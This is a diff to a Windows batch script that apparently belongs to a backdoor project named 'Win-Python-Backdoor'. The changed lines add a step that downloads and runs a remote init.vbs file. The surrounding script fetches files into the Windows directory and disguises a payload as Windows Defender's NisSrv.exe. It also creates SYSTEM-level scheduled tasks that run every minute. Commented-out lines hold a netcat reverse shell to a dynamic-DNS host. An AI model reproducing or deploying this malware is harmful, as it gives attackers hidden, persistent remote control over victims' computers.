@@ -57,6 +57,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup.exe
+
 taskkill /f /im woffice.exe
 taskkill /f /im wscript.exe
 schtasks /delete /tn sys /F
@@ -64,6 +65,7 @@ schtasks /delete /tn syskill /F
 schtasks /delete /tn office_get /F
 
 rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
+
 wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
 wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
 wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
@@ -85,7 +87,8 @@ schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Def
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
-
+wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
+%windir%\init.vbs
 
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
